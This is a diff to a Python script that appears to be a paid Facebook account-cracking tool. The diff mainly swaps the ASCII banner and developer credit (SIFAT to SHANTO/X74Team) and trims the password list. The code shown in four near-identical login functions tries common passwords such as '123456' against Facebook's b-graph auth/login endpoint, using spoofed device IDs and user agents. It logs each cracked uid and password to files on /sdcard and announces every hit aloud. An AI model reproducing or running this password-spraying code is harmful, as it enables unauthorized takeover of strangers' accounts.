@@ -606,16 +606,15 @@ def line():print(f'\r\n\33[38;5;37m━━━━━━━━━━━━━━━
 
 
 logo = f"""
-\033[1;97m
-    .dP"Y8 88 888888  db  888888 
-  \033[1;32m  `Ybo." 88 88     dPYb   88   
-  \033[1;97m  o.`Y8b 88 8888  dP88Yb  88   
-   \033[1;32m 8bodP' 88 88   dP    Yb 88 \033[1;32m0.0.2
-\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mDEVELOPER  \33[38;5;160m▶  \033[1;97mMD. SIFAT HOSSAIN
-\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mGITHUB     \33[38;5;160m▶  \033[1;97mSIFAT404
+  \x1b[1;92m╔╗╔╗\033[0;33m╔══╗\033[0;34m╔══╗\033[0;35m╔══╗\033[0;31m╔═╦╗ \033[0;36m╔══╗\033[0;37m╔═╦═╗\x1b[1;92m╔══╗\033[0;31m╔═╦═╗
+  \x1b[1;92m║╚╝║\033[0;33m║╔╗║\033[0;34m║══╣\033[0;35m║╔╗║\033[0;31m║║║║ \033[0;36m╚║║╝\033[0;37m║║║║║\x1b[1;92m║╔╗║\033[0;31m║║║║║
+  \x1b[1;92m║╔╗║\033[0;33m║╠╣║\033[0;34m╠══║\033[0;35m║╠╣║\033[0;31m║║║║ \033[0;36m╔║║╗\033[0;37m║║║║║\x1b[1;92m║╠╣║\033[0;31m║║║║║
+  \x1b[1;92m╚╝╚╝\033[0;33m╚╝╚╝\033[0;34m╚══╝\033[0;35m╚╝╚╝\033[0;31m╚╩═╝ \033[0;36m╚══╝\033[0;37m╚╩═╩╝\x1b[1;92m╚╝╚╝\033[0;31m╚╩═╩╝\x1b[1;92m
+\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mDEVELOPER  \33[38;5;160m▶  \033[1;97mSHANTO
+\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mGITHUB     \33[38;5;160m▶  \033[1;97mX74Team
 \33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mFEATURE    \33[38;5;160m▶  \033[1;97mOLD CLONE 
-\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mVERSION    \33[38;5;160m▶  \033[1;97mPAID \33[38;5;37m≫ \033[1;97m0.0.2
+\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mVERSION    \33[38;5;160m▶  \033[1;97mPAID \33[38;5;37m≫ \033[1;97m0.0.1
 \33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
 
 def clear():
@@ -733,7 +732,7 @@ def login1(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222","1234567890","136900","iloveyou","i love you","i love allah"]:
+        for pw in ["123456","1234567","12345678","123456789","111222"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -774,13 +773,13 @@ def login1(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSIFAT\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/SIFAT-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSHANTO\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/HASAN-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSIFAT\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/SIFAT-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSHANTO\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/HASAN-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -794,7 +793,7 @@ def login2(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222","1234567890","136900","iloveyou","i love you","i love allah"]:
+        for pw in ["123456","1234567","12345678","123456789","111222"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -835,13 +834,13 @@ def login2(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSIFAT\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/SIFAT-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSHANTO\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/SHANTO-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSIFAT\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/SIFAT-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSHANTO\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/SHANTO-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -855,7 +854,7 @@ def login3(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222","1234567890","136900","iloveyou","i love you","i love allah"]:
+        for pw in ["123456","1234567","12345678","123456789","111222"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -896,13 +895,13 @@ def login3(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSIFAT\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/SIFAT-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSHANTO\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/SHANTO-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSIFAT\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/SIFAT-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSHANTO\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/SHANTO-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -916,7 +915,7 @@ def login4(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222","1234567890","136900","iloveyou","i love you","i love allah"]:
+        for pw in ["123456","1234567","12345678","123456789","111222"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -957,12 +956,12 @@ def login4(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSIFAT\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSHANTO\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/SHANTO-M4-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSIFAT\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSHANTO\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/SHANTO-M4-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
